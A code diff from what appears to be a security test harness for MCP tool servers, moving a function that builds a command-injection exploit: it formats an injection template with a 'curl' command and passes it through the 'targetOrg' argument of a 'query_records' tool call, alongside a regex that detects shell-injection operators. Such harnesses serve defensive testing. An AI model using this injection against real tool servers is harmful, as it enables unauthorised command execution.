@@ -72,6 +72,14 @@ AIM = re.compile(r"[;&|`]|\$\(")  # a shell-injection operator in a tool argumen
 Exploit = Callable[[Places, MCPClientPort], Awaitable[None]]
 
 
+def _make_exploit(place_id: str) -> Exploit:
+    async def exploit(places: Places, client: MCPClientPort) -> None:
+        payload = _INJECT.format(cmd=_read_command(places[place_id]))
+        await client.call_tool("query_records", _call(payload))
+
+    return exploit
+
+
 def _call(target_org: str, *, fields: str = "Id", sobject: str = "Account") -> dict[str, object]:
     return {"input": {"targetOrg": target_org, "sObject": sobject, "fields": fields}}
 
@@ -93,14 +101,6 @@ def _read_command(place: Place) -> str:
         assert coords.host is not None and coords.path is not None
         return f"curl -s http://{coords.host}{request_target(coords.path)}"
     raise ValueError(f"{place.id}: no command_execution reader for kind {place.kind}")
-
-
-def _make_exploit(place_id: str) -> Exploit:
-    async def exploit(places: Places, client: MCPClientPort) -> None:
-        payload = _INJECT.format(cmd=_read_command(places[place_id]))
-        await client.call_tool("query_records", _call(payload))
-
-    return exploit
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
